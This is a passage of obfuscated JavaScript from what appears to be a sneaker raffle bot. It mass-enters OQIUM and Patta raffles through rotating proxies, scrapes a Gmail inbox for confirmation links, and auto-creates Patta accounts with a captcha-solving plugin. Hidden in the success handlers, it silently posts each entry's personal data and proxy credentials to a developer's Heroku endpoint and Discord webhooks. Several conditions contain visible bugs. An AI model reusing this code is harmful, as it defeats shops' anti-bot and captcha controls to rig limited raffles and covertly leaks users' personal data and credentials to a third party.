                                                } catch {
                                                }
                                                _0x34c52d(_0x671684[_0x5624ef], _0x8a4956);
                                            }
                                            _0x4d6734(console['log'](_0x10a2e3['green'](_0x451967() + '\x20[' + _0x8a4956['name'] + ']\x20Task\x20' + (_0x5624ef + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x236695 != 'ver') {
                                                var _0x2f26ed = '' + _0x32f741, _0x21043c = await _0x14203e(_0x671684[_0x5624ef], _0x8a4956, 'dev', !![], _0x2f26ed), _0x484fce = {};
                                                _0x484fce['errorDEV'] = { 'embeds': [_0x21043c] }, _0x48f0c7(_0x671684[_0x5624ef], _0x8a4956), _0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '' && await _0x1bfffd(_0x30cea3['webhook'], _0x484fce['errorDEV']), await _0x1bfffd(_0x31e47f, _0x484fce['errorDEV']);
                                            }
                                            _0x919a06(console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x8a4956['name'] + ']\x20Task\x20' + (_0x5624ef + 0x1) + ':\x20' + _0x32f741)));
                                        }
                                    };
                                    try {
                                        _0x236695 != 'ver' ? console['log'](_0x451967() + '\x20[' + _0x8a4956['name'] + ']\x20Task\x20' + (_0x5624ef + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x20b590['data']['attributes']['email']) : console['log'](_0x451967() + '\x20[' + _0x8a4956['name'] + ']\x20Task\x20' + (_0x5624ef + 0x1) + ':\x20Fetching\x20Response'), _0x17f04c(_0x10f7ea, callback);
                                    } catch (_0x400f3d) {
                                        console['log'](_0x451967() + '\x20Task\x20' + (_0x5624ef + 0x1) + ':\x20' + _0x400f3d);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x29e64e(_0x557bc4, 'ver', _0x244e8d, _0x54adbb, _0x1b497c), console['log'](_0x451967() + '\x20[' + _0x244e8d['name'] + ']\x20Sleeping\x20for\x20' + _0x30cea3['delay'] + '\x20ms'), await _0x2be9fc(_0x30cea3['delay']);
                            } catch (_0x1123d6) {
                            }
                        }
                    }
                    try {
                        _0x4a9582();
                        while (!_0x16183d) {
                            await _0x2be9fc(0xbb8);
                        }
                        console['log']('Found\x20' + _0x3f6142['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x2be9fc(0x9c4);
                    }
                    await _0x5f0007(_0x9788c5, _0x3f6142, _0x2631f0);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RVHsXu',
                            'custom_source': 'DH6927-017',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'ScxJcu',
                                '$consent_form_version': 0x8c005b,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x339e99, _0x41042d, _0x2713c5) {
                    var _0x3222d0 = _0x41042d, _0x215171 = 0x0;
                    for (var _0x475da4 = 0x0; _0x475da4 < _0x41042d['length']; _0x475da4++) {
                        maxTasks = _0x30cea3['threads'];
                        while (_0x215171 >= maxTasks) {
                            await _0x2be9fc(_0x30cea3['delay']);
                        }
                        async function _0x31be71(_0x2f360e, _0x579d0f, _0x2cec95, _0x4d3715) {
                            try {
                                await _0x319293(_0x579d0f, _0x4d3715);
                            } catch (_0x5d3b12) {
                                throw new Error(_0x5d3b12);
                            }
                            async function _0x4268ca(_0x4f897c, _0x5d8681, _0x50beb1, _0x22bb75, _0x234d8b) {
                                _0x215171++;
                                var _0x3df750, _0x466305 = {}, _0x584a01 = [], _0x217ea7 = {}, _0x49de87 = [
                                    '40',
                                    '40.5',
                                    '41',
                                    '42',
                                    '42.5',
                                    '43',
                                    '44',
                                    '45',
                                    '45.5',
                                    '46',
                                    '47',
                                    '47.5',
                                    '48'
                                ], _0x160c9c = Math['round'](Math['random']() * (_0x49de87['length'] - 0x1));
                                !_0x22bb75 && (_0x22bb75 = {});
                                if (_0x5d8681 != 'ver') {
                                    _0x1a7b1b(_0x50beb1['name'] + '\x20Task\x20' + (_0x4f897c + 0x1) + '\x20/\x20' + _0x22bb75['length'] + '\x20||\x20File:\x20' + _0x733fd9 + '\x20Proxies:\x20' + _0x253bf1), _0x584a01 = [{
                                        'type': 'rich',
                                        'title': 'Succesful\x20OQIUM\x20Entry',
                                        'description': '',
                                        'color': 0xc0d6d6,
                                        'fields': [
                                            {
                                                'name': 'User',
                                                'value': '' + _0x3373db
                                            },
                                            {
                                                'name': 'Size',
                                                'value': '' + _0x22bb75[_0x4f897c]['Size']
                                            },
                                            {
                                                'name': 'Delay',
                                                'value': '' + _0x30cea3['delay']
                                            },
                                            {
                                                'name': 'Version',
                                                'value': '' + _0x1feaa0
                                            }
                                        ]
                                    }], _0x217ea7 = { 'embeds': _0x584a01 }, _0x466305 = _0x50beb1['data'], _0x466305['data']['attributes']['email'] = '' + _0x22bb75[_0x4f897c]['Email'];
                                    if (_0x22bb75[_0x4f897c]['Size'] == 'RANDOM') {
                                    }
                                    _0x466305['data']['attributes']['properties']['$first_name'] = '' + _0x22bb75[_0x4f897c]['FirstName'], _0x466305['data']['attributes']['properties']['$last_name'] = '' + _0x22bb75[_0x4f897c]['LastName'], _0x466305['data']['attributes']['properties']['$address1'] = _0x22bb75[_0x4f897c]['Address1'] + '\x20' + _0x22bb75[_0x4f897c]['Address2'] + '\x20' + _0x22bb75[_0x4f897c]['HouseNumber'], _0x466305['data']['attributes']['properties']['$zip'] = '' + _0x22bb75[_0x4f897c]['Zip'], _0x466305['data']['attributes']['properties']['$city'] = '' + _0x22bb75[_0x4f897c]['City'], _0x466305['data']['attributes']['properties']['$country'] = '' + _0x22bb75[_0x4f897c]['Country'], _0x22bb75[_0x4f897c]['Size'] == 'RANDOM' ? _0x466305['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x49de87[_0x160c9c] : _0x466305['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x22bb75[_0x4f897c]['Size'], _0x466305['data']['attributes']['properties']['$phone_number'] = '' + _0x22bb75[_0x4f897c]['Phone'], _0x466305['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x22bb75[_0x4f897c]['Follower'];
                                }
                                if (_0x30cea3['useRandomProxy'] = ![])
                                    var _0x4b4c73 = _0x234d8b[_0x4f897c]['split'](':');
                                else
                                    var _0x54d32f = Math['round'](Math['random']() * (_0x234d8b['length'] - 0x1)), _0x4b4c73 = _0x234d8b[_0x54d32f]['split'](':');
                                var _0x5ce083 = {
                                    'jar': _0x4a6742,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x50beb1['url'],
                                    'headers': _0x50beb1['headers'],
                                    'body': JSON['stringify'](_0x466305),
                                    'proxy': 'http://' + _0x4b4c73[0x2] + ':' + _0x4b4c73[0x3] + '@' + _0x4b4c73[0x0] + ':' + _0x4b4c73[0x1]
                                };
                                return _0x5d8681 != 'ver' && (_0x5ce083['url'] = _0x50beb1['url'], _0x5ce083['headers'] = _0x50beb1['headers']), _0x5d8681 == 'ver' && (_0x5ce083['method'] = 'GET'), new Promise(function (_0x414316, _0x30890f) {
                                    callback = async (_0x5675de, _0x327bc1, _0xc27bdb) => {
                                        if (!_0x5675de && _0x327bc1['statusCode'] == 0xca || !_0x5675de && _0x327bc1['statusCode'] == 0xc8) {
                                            if (_0x5d8681 != 'ver') {
                                                var _0x4b7f5b = await _0x14203e(_0x22bb75[_0x4f897c], _0x50beb1, 'dev', ![]), _0x213e74 = await _0x14203e(_0x22bb75[_0x4f897c], _0x50beb1, 'pub', ![]);
                                                const _0x40b759 = {
                                                    'succesDEVMSG': { 'embeds': [_0x4b7f5b] },
                                                    'succesPUBMSG': { 'embeds': [_0x213e74] }
                                                };
                                                let _0x52fe4f = _0x22bb75[_0x4f897c];
                                                try {
                                                    prxdata = {
                                                        'username': _0x3373db['replace']('#', ''),
                                                        'module': _0x50beb1['name'],
                                                        'entrydata': JSON['stringify'](_0x52fe4f),
                                                        'proxy': '' + _0x234d8b[_0x4f897c]
                                                    };
                                                    var _0x1052cc = JSON['stringify'](prxdata);
                                                    let _0x42f54c = { 'headers': { 'content-type': 'application/json' } };
                                                    await _0x2c480f['post']('https://jraffles.herokuapp.com/success', _0x1052cc, _0x42f54c);
                                                } catch (_0x385734) {
                                                }
                                                if (_0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '')
                                                    try {
                                                        await _0x1bfffd(_0x30cea3['webhook'], _0x40b759['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x2be9fc(0xc8), await _0x1bfffd(_0x301a88, _0x40b759['succesDEVMSG']), await _0x2be9fc(0xc8);
                                                try {
                                                    await _0x1bfffd(_0x3b111f, _0x40b759['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x34c52d(_0x22bb75[_0x4f897c], _0x50beb1);
                                            }
                                            _0x215171--, _0x414316(console['log'](_0x10a2e3['green'](_0x451967() + '\x20[' + _0x50beb1['name'] + ']\x20Task\x20' + (_0x4f897c + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x5d8681 != 'ver') {
                                                var _0x2e34b9 = '' + _0x5675de, _0x5d2b42 = await _0x14203e(_0x22bb75[_0x4f897c], _0x50beb1, 'dev', !![], _0x2e34b9), _0x2b5f76 = {};
                                                _0x2b5f76['errorDEV'] = { 'embeds': [_0x5d2b42] }, _0x48f0c7(_0x22bb75[_0x4f897c], _0x50beb1), _0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '' && await _0x1bfffd(_0x30cea3['webhook'], _0x2b5f76['errorDEV']), await _0x1bfffd(_0x31e47f, _0x2b5f76['errorDEV']);
                                            }
                                            _0x215171--, _0x30890f(console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x50beb1['name'] + ']\x20Task\x20' + (_0x4f897c + 0x1) + ':\x20' + _0x5675de)));
                                        }
                                    };
                                    try {
                                        _0x5d8681 != 'ver' && console['log'](_0x451967() + '\x20[' + _0x50beb1['name'] + ']\x20Task\x20' + (_0x4f897c + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x466305['data']['attributes']['email']), _0x17f04c(_0x5ce083, callback);
                                    } catch (_0x10f233) {
                                        console['log'](_0x451967() + '\x20Task\x20' + (_0x4f897c + 0x1) + ':\x20' + _0x10f233);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x4268ca(_0x4d3715, 'nor', _0x2f360e, _0x579d0f, _0x2cec95), console['log'](_0x451967() + '\x20[' + _0x2f360e['name'] + ']\x20Sleeping\x20for\x20' + _0x30cea3['delay'] + '\x20ms'), await _0x2be9fc(_0x30cea3['delay']);
                            } catch (_0xf18bd8) {
                            }
                        }
                        _0x31be71(_0x339e99, _0x3222d0, _0x2713c5, _0x475da4), await _0x2be9fc(0x3e8);
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x2eccb5, _0x5af57c, _0x4403f7) {
                    var _0x5af57c = [], _0xbf6a4a = ![];
                    async function _0x4c1cb9() {
                        var _0x1c3dc1 = new _0x2e8fd8({
                            'user': _0x30cea3['masterMail'],
                            'password': _0x30cea3['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x4d19df(_0x1e6bfb) {
                            _0x1c3dc1['openBox']('INBOX', ![], _0x1e6bfb);
                        }
                        _0x1c3dc1['once']('ready', function () {
                            _0x4d19df(function (_0x520afa, _0x1909e3) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x520afa)
                                    throw _0x520afa;
                                _0x1c3dc1['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ],
                                    [
                                        'FROM',
                                        'OQIUM'
                                    ]
                                ], function (_0x35a5eb, _0x49c786) {
                                    if (!_0x49c786 || !_0x49c786['length'])
                                        console['log'](_0x451967() + '\x20[' + _0x2eccb5['name'] + ']\x20No\x20mails\x20found'), _0x1c3dc1['end']();
                                    else {
                                        var _0x39f2b9 = _0x1c3dc1['seq']['fetch'](_0x49c786, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x39f2b9['on']('message', function (_0xdcd624, _0x1b6259) {
                                            var _0x4ab25d = '(#' + _0x1b6259 + ')\x20';
                                            _0xdcd624['on']('body', function (_0x226466, _0x3d478f) {
                                                _0x2f2a1d(_0x226466, (_0x63a29e, _0x41781e) => {
                                                    var _0x396f1a = _0x41781e['text']['split']('(')[0x1], _0xdc460e = _0x396f1a['split'](')')[0x0];
                                                    _0x5af57c['push'](_0xdc460e);
                                                });
                                            }), _0xdcd624['once']('end', function () {
                                            });
                                        }), _0x39f2b9['once']('error', function (_0xf8fec1) {
                                            console['log']('Fetch\x20error:\x20' + _0xf8fec1), _0xbf6a4a = !![];
                                        }), _0x39f2b9['once']('end', function () {
                                            _0x1c3dc1['end'](), _0xbf6a4a = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x1c3dc1['once']('error', function (_0x334ce3) {
                            console['log'](_0x334ce3), _0xbf6a4a = !![];
                        }), _0x1c3dc1['once']('end', async function () {
                            _0xbf6a4a = !![];
                        }), _0x1c3dc1['connect']();
                    }
                    async function _0x24b02e(_0x43e2a8, _0x207dbb, _0x29b00d) {
                        for (var _0x31c204 = 0x0; _0x31c204 < _0x207dbb['length']; _0x31c204++) {
                            async function _0x3da89e(_0x13883d, _0x535137, _0x137298, _0x42bc65, _0x2ac022) {
                                var _0x412dde, _0x3dbf68 = {}, _0x203502 = [], _0x1a8c48 = {}, _0x41dd7c = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0xcffa7d = Math['round'](Math['random']() * (_0x41dd7c['length'] - 0x1));
                                _0x42bc65[_0x13883d]['Size'] == 'RANDOM' && (_0x42bc65[_0x13883d]['Size'] = _0x41dd7c[_0xcffa7d]);
                                !_0x42bc65 && (_0x42bc65 = {});
                                if (_0x30cea3['useRandomProxy'] = ![])
                                    var _0xbda1 = _0x2ac022[_0x13883d]['split'](':');
                                else
                                    var _0xea3f61 = Math['round'](Math['random']() * (_0x2ac022['length'] - 0x1)), _0xbda1 = _0x2ac022[_0xea3f61]['split'](':');
                                var _0x1c2d88 = {
                                    'jar': _0x4a6742,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x137298['url'],
                                    'headers': _0x137298['headers'],
                                    'body': JSON['stringify'](_0x3dbf68),
                                    'proxy': 'http://' + _0xbda1[0x2] + ':' + _0xbda1[0x3] + '@' + _0xbda1[0x0] + ':' + _0xbda1[0x1]
                                };
                                return _0x535137 != 'ver' && (_0x1c2d88['url'] = _0x137298['url'], _0x1c2d88['headers'] = _0x137298['headers']), _0x535137 == 'ver' && (_0x1c2d88['method'] = 'GET', _0x1c2d88['url'] = _0x42bc65[_0x13883d]), new Promise(function (_0x130c26, _0x53394a) {
                                    callback = async (_0x3efcdb, _0x19d072, _0x10c8c5) => {
                                        if (!_0x3efcdb && _0x19d072['statusCode'] == 0xca || !_0x3efcdb && _0x19d072['statusCode'] == 0xc8) {
                                            if (_0x535137 != 'ver') {
                                                var _0x150d17 = await _0x14203e(_0x42bc65[_0x13883d], _0x137298, 'dev', ![]), _0x35097a = await _0x14203e(_0x42bc65[_0x13883d], _0x137298, 'pub', ![]);
                                                const _0x4acb31 = {
                                                    'succesDEVMSG': { 'embeds': [_0x150d17] },
                                                    'succesPUBMSG': { 'embeds': [_0x35097a] }
                                                };
                                                if (_0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '')
                                                    try {
                                                        await _0x1bfffd(_0x30cea3['webhook'], _0x4acb31['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x2be9fc(0xc8), await _0x1bfffd(_0x301a88, _0x4acb31['succesDEVMSG']), await _0x2be9fc(0xc8);
                                                try {
                                                    await _0x1bfffd(_0x3b111f, _0x4acb31['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x34c52d(_0x42bc65[_0x13883d], _0x137298);
                                            }
                                            _0x130c26(console['log'](_0x10a2e3['green'](_0x451967() + '\x20[' + _0x137298['name'] + ']\x20Task\x20' + (_0x13883d + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x535137 != 'ver') {
                                                var _0x1e785f = '' + _0x3efcdb, _0x1420e2 = await _0x14203e(_0x42bc65[_0x13883d], _0x137298, 'dev', !![], _0x1e785f), _0x16c567 = {};
                                                _0x16c567['errorDEV'] = { 'embeds': [_0x1420e2] }, _0x48f0c7(_0x42bc65[_0x13883d], _0x137298), _0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '' && await _0x1bfffd(_0x30cea3['webhook'], _0x16c567['errorDEV']), await _0x1bfffd(_0x31e47f, _0x16c567['errorDEV']);
                                            }
                                            _0x53394a(console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x137298['name'] + ']\x20Task\x20' + (_0x13883d + 0x1) + ':\x20' + _0x3efcdb)));
                                        }
                                    };
                                    try {
                                        _0x535137 != 'ver' ? console['log'](_0x451967() + '\x20[' + _0x137298['name'] + ']\x20Task\x20' + (_0x13883d + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x3dbf68['data']['attributes']['email']) : console['log'](_0x451967() + '\x20[' + _0x137298['name'] + ']\x20Task\x20' + (_0x13883d + 0x1) + ':\x20Fetching\x20Response'), _0x17f04c(_0x1c2d88, callback);
                                    } catch (_0x3ba030) {
                                        console['log'](_0x451967() + '\x20Task\x20' + (_0x13883d + 0x1) + ':\x20' + _0x3ba030);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x3da89e(_0x31c204, 'ver', _0x43e2a8, _0x207dbb, _0x29b00d), console['log'](_0x451967() + '\x20[' + _0x43e2a8['name'] + ']\x20Sleeping\x20for\x20' + _0x30cea3['delay'] + '\x20ms'), await _0x2be9fc(_0x30cea3['delay']);
                            } catch (_0x319b0d) {
                            }
                        }
                    }
                    try {
                        _0x4c1cb9();
                        while (!_0xbf6a4a) {
                            await _0x2be9fc(0xfa0);
                        }
                        console['log']('Found\x20' + _0x5af57c['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x24b02e(_0x2eccb5, _0x5af57c, _0x4403f7);
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x2eb16f, _0x7ecb44, _0x157a17) {
                    _0x3d8cc4['use'](_0x29d882()), _0x3d8cc4['use'](_0x173890({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x30cea3['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3fd2ac = 0x0; _0x3fd2ac < _0x7ecb44['length']; _0x3fd2ac++) {
                        var _0x178c0d = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x3373db
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x30cea3['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x1feaa0
                                }
                            ]
                        }];
                        const _0x2effef = { 'embeds': _0x178c0d };
                        _0x1a7b1b(_0x2eb16f['name'] + '\x20Task\x20' + (_0x3fd2ac + 0x1) + '\x20/\x20' + _0x7ecb44['length'] + '\x20||\x20File:\x20' + _0x733fd9 + '\x20Proxies:\x20' + _0x253bf1);
                        try {
                            await _0x319293(_0x7ecb44, _0x3fd2ac);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x1f32a8 = await _0x14203e(_0x7ecb44[_0x3fd2ac], _0x2eb16f, 'acc', ![]);
                        const _0xcc4d7a = { 'succesDEVMSG': { 'embeds': [_0x1f32a8] } };
                        if (_0x7ecb44[_0x3fd2ac]['Email'] == '' || _0x7ecb44[_0x3fd2ac]['FirstName'] == '' || _0x7ecb44[_0x3fd2ac]['LastName'] == '') {
                            console['log'](_0x451967() + '\x20[' + _0xae095a[taskModule]['name'] + ']\x20Task\x20' + (_0x3fd2ac + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x2be9fc(0x7d0);
                            continue;
                        }
                        (_0x7ecb44[_0x3fd2ac]['Password'] == '' || _0x7ecb44[_0x3fd2ac] == undefined) && _0x7ecb44[_0x3fd2ac]['Password'] == 'JRaffles23!';
                        if (_0x30cea3['useRandomProxy'] = ![])
                            var _0x522dfe = _0x157a17[_0x3fd2ac]['split'](':');
                        else
                            var _0x5318c8 = Math['round'](Math['random']() * (_0x157a17['length'] - 0x1)), _0x522dfe = _0x157a17[_0x5318c8]['split'](':');
                        var _0x529d3c;
                        try {
                            _0x529d3c = await _0x3d8cc4['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x522dfe[0x0] + ':' + _0x522dfe[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x529d3c = await _0x3d8cc4['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x522dfe[0x0] + ':' + _0x522dfe[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2146d0 = await _0x529d3c['newPage']();
                            await _0x2146d0['authenticate']({
                                'username': '' + _0x522dfe[0x2],
                                'password': '' + _0x522dfe[0x3]
                            }), console['log'](_0x451967() + '\x20[' + _0x2eb16f['name'] + ']\x20Task\x20' + (_0x3fd2ac + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2146d0['setRequestInterception'](!![]), _0x2146d0['on']('request', _0x2a2f8b => {
                                _0x2a2f8b['resourceType']() === 'image' || _0x2a2f8b['resourceType']() === 'font' || _0x2a2f8b['resourceType']() === 'media' ? _0x2a2f8b['abort']() : _0x2a2f8b['continue']();
                            }), await _0x2146d0['goto']('https://patta.nl/account/register'), await _0x2be9fc(0xbb8), await _0x2146d0['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x451967() + '\x20[' + _0x2eb16f['name'] + ']\x20Task\x20' + (_0x3fd2ac + 0x1) + '\x20:\x20Filling\x20information'), await _0x2146d0['type']('#RegisterForm-FirstName', '' + _0x7ecb44[_0x3fd2ac]['FirstName']), await _0x2be9fc(0x226), await _0x2146d0['type']('#RegisterForm-LastName', '' + _0x7ecb44[_0x3fd2ac]['LastName']), await _0x2be9fc(0x226), await _0x2146d0['type']('#RegisterForm-email', '' + _0x7ecb44[_0x3fd2ac]['Email']), await _0x2be9fc(0x226), await _0x2146d0['type']('#RegisterForm-password', '' + _0x7ecb44[_0x3fd2ac]['Password']), await _0x2be9fc(0x226), console['log'](_0x451967() + '\x20[' + _0x2eb16f['name'] + ']\x20Task\x20' + (_0x3fd2ac + 0x1) + '\x20:\x20Submitting..'), await _0x2146d0['$eval']('#RegisterForm', _0x5a6782 => _0x5a6782['submit']()), await _0x2be9fc(0x1f40);
                            try {
                                await _0x2146d0['waitForSelector']('.home-page-grid__collection'), await _0x2be9fc(0x1f4), console['log'](_0x10a2e3['green'](_0x451967() + '\x20[' + _0x2eb16f['name'] + ']\x20Task\x20' + (_0x3fd2ac + 0x1) + '\x20:\x20Account\x20' + _0x7ecb44[_0x3fd2ac]['Email'] + '\x20Generated!')), _0xa4bb3a['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x7ecb44[_0x3fd2ac]['Email'] + ',' + _0x7ecb44[_0x3fd2ac]['Password']), console['log'](_0x10a2e3['yellow'](_0x451967() + '\x20[' + _0x2eb16f['name'] + ']\x20Task\x20' + (_0x3fd2ac + 0x1) + '\x20:\x20Account\x20' + _0x7ecb44[_0x3fd2ac]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '' && await _0x1bfffd(_0x30cea3['webhook'], _0xcc4d7a['succesDEVMSG']);
                                } catch {
                                }
                                await _0x1bfffd(_0x3708dd, _0xcc4d7a['succesDEVMSG']);
                            } catch (_0x4c9dc8) {
                                console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0xae095a[taskModule]['name'] + ']\x20Task\x20' + (_0x3fd2ac + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x4c9dc8));
                            }
                        } catch (_0x33c407) {
                            console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0xae095a[taskModule]['name'] + ']\x20Task\x20' + (_0x3fd2ac + 0x1) + '\x20:\x20' + _0x33c407));
                        } finally {
                            _0x529d3c && _0x529d3c['close'](), console['log']('Waiting\x20for\x20' + _0x30cea3['delay'] + '\x20ms'), await _0x2be9fc(_0x30cea3['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0xead5d9, _0x26529d, _0x3fb07b) {
                    _0x3d8cc4['use'](_0x29d882()), _0x3d8cc4['use'](_0x173890({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x30cea3['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3e1a9a = 0x0; _0x3e1a9a < _0x26529d['length']; _0x3e1a9a++) {
                        var _0x231734;
                        if (_0x5b680f != 'yes')
                            var _0x5b680f = '', _0x15b0d7 = 0x0;
